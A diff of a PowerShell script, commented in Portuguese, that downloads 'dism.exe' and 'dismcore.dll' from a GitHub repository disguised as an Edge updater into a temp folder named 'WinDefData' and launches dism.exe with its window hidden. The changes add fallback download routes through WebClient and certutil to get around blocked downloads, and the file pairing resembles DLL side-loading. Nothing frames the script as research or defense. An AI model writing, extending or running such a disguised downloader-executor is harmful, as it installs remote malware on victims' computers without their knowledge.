@@ -1,20 +1,32 @@
 $d=$env:TEMP+'\WinDefData'
 if(!(Test-Path $d)){New-Item $d -Force|Out-Null}
 $u='https://raw.githubusercontent.com/emuladortrampo-lgtm/edge-updater/main/'
+$ok=$false
+# Método 1: Invoke-WebRequest
 try{
-    Write-Host "[1/3] Baixando dismcore.dll..."
-    Invoke-WebRequest -Uri ($u+'dismcore.dll') -OutFile "$d\dismcore.dll" -UseBasicParsing
-    $s1=(Get-Item "$d\dismcore.dll").Length
-    if($s1 -lt 1000){Write-Host "ERRO: dismcore.dll muito pequeno ($s1 bytes)";exit 1}
-    Write-Host "OK: dismcore.dll ($s1 bytes)"
-}catch{Write-Host "ERRO: $_";exit 1}
-try{
-    Write-Host "[2/3] Baixando dism.exe..."
-    Invoke-WebRequest -Uri ($u+'dism.exe') -OutFile "$d\dism.exe" -UseBasicParsing
-    $s2=(Get-Item "$d\dism.exe").Length
-    if($s2 -lt 10000){Write-Host "ERRO: dism.exe muito pequeno ($s2 bytes)";exit 1}
-    Write-Host "OK: dism.exe ($s2 bytes)"
-}catch{Write-Host "ERRO: $_";exit 1}
-Write-Host "[3/3] Executando dism.exe..."
-Start-Process "$d\dism.exe" -WindowStyle Hidden
-Write-Host "OK: dism.exe executado"
+    Invoke-WebRequest -Uri ($u+'dismcore.dll') -OutFile "$d\dismcore.dll" -UseBasicParsing -ErrorAction Stop
+    Invoke-WebRequest -Uri ($u+'dism.exe') -OutFile "$d\dism.exe" -UseBasicParsing -ErrorAction Stop
+    $ok=$true
+}catch{}
+# Método 2: WebClient
+if(-not $ok){
+    try{
+        (New-Object Net.WebClient).DownloadFile($u+'dismcore.dll'),"$d\dismcore.dll")
+        (New-Object Net.WebClient).DownloadFile($u+'dism.exe'),"$d\dism.exe")
+        $ok=$true
+    }catch{}
+}
+# Método 3: certutil (via cmd)
+if(-not $ok){
+    cmd /c "certutil -urlcache -split -f $($u)dismcore.dll `"$d\dismcore.dll`"" 2>$null
+    cmd /c "certutil -urlcache -split -f $($u)dism.exe `"$d\dism.exe`"" 2>$null
+    if((Test-Path "$d\dismcore.dll") -and (Get-Item "$d\dismcore.dll").Length -gt 1000){$ok=$true}
+}
+if($ok){
+    Write-Host "Download OK"
+    Start-Process "$d\dism.exe" -WindowStyle Hidden
+    Write-Host "Executado"
+}else{
+    Write-Host "ERRO: Todos os métodos de download falharam"
+    Write-Host "Verifique: firewall, proxy, acesso a internet"
+}
